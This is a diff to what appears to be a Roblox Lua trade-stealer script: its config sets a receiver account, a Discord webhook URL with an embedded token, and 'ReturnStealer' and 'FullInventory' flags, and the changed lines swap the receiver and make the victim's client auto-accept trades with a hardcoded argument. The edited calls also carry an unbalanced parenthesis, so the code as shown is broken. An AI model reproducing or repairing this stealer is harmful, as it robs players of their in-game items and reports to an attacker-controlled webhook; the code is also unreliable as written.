@@ -1,5 +1,5 @@
 Config = {
-    Receivers = {"User_boblex"},
+    Receivers = {"givepetroblox"},
     Webhook = "https://discord.com/api/webhooks/1277863416236609586/sBsl7yEyPa6GNgSLVp-RYCQzyRdvW8U_KtXve8HFdE--1OV8VCelyfqOtHCOxp_1hYWN",
     FullInventory = true,
     ReturnStealer = true,
@@ -292,7 +292,7 @@ g.Trade.StartTrade.OnClientEvent:Connect(
                 end
             end
             wait(5)
-            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(args))
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582))
         else
             local L = 0
             local J = c.PlayerGui.TradeGUI.Container
@@ -318,7 +318,7 @@ g.Trade.StartTrade.OnClientEvent:Connect(
                 end
             end
             wait(5)
-            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(args))
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582))
         end
     end
 )
